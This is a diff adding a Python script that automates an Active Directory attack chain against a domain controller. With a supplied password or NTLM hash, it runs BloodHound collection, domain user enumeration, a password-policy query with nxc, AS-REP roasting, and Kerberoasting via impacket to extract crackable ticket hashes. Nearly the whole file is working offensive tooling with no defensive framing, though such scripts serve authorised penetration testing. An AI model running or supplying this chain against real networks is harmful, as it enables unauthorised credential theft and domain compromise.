@@ -1,0 +1,83 @@
+#!/usr/bin/env python3
+
+import argparse
+import subprocess
+import threading
+import shlex
+import sys
+
+    
+def run_command(command, debug=False, always_show_output=False):
+    if debug:
+        print(f"[+] Running: {command}")
+    
+    result = subprocess.run(
+        shlex.split(command),
+        capture_output=True,  # Always capture output
+        text=True
+    )
+    
+    if (debug or always_show_output) and result.stdout:
+        print(result.stdout)
+    if (debug or always_show_output) and result.stderr:
+        print(result.stderr, file=sys.stderr)
+
+    return result.stdout.strip() if result.stdout else ""
+
+def start_bloodhound(ip, user, password_or_hash, use_hash):
+    auth = f"-H {password_or_hash}" if use_hash else f"-p {password_or_hash}"
+    cmd = f"bloodhound-collect -i {ip} -u {user} {auth}"
+    run_command(cmd)
+
+def main():
+    parser = argparse.ArgumentParser(description="Automate basic AD recon steps")
+    parser.add_argument("-i", metavar="IP", required=True, help="Domain controller IP")
+    parser.add_argument("-u", metavar="USER", required=True, help="Domain username")
+    group = parser.add_mutually_exclusive_group(required=True)
+    group.add_argument("-p", metavar="password", help="Password")
+    group.add_argument("-H", metavar="NTLM hash", help="NTLM hash")
+    parser.add_argument("--debug", action="store_true", help="Show all command output")
+    args = parser.parse_args()
+
+    ip = args.i
+    user = args.u
+    password_or_hash = args.p or args.H
+    use_hash = args.H is not None
+
+    # Start BloodHound in a thread
+    bh_thread = threading.Thread(target=start_bloodhound, args=(ip, user, password_or_hash, use_hash))
+    bh_thread.start()
+
+    print(f"[+] Starting...")
+
+    auth = f"-H {password_or_hash}" if use_hash else f"-p {password_or_hash}"
+
+    # Step 1: Get domain name
+    domain_cmd = f"get-domain -i {ip} -u {user} {auth}"
+    domain = run_command(domain_cmd, debug=args.debug)
+
+    # Step 2: Get AD users
+    users_cmd = f"get-domain-users -i {ip} -u {user} {auth} -o users"
+    run_command(users_cmd, debug=args.debug)
+
+    # Step 3: Get password policy
+    subprocess.run(["nxc", "smb", ip, "-u", user, auth.replace(" ", ""), "--pass-pol"])
+
+    # Step 4: AS-REP Roasting
+    asrep_cmd = f"as-rep-roast -i {ip} -d {domain} -u users"
+    if args.debug:
+        asrep_cmd += " --debug"
+    run_command(asrep_cmd, always_show_output=True)
+
+    # Step 5: Kerberoasting
+    if use_hash:
+        kerb_cmd = f"impacket-GetUserSPNs -request -dc-ip {ip} {domain}/{user} -hashes :{password_or_hash}"
+    else:
+        kerb_cmd = f"impacket-GetUserSPNs -request -dc-ip {ip} {domain}/{user}:{password_or_hash}"
+    run_command(kerb_cmd, always_show_output=True)
+
+    bh_thread.join()
+
+if __name__ == "__main__":
+    main()
+
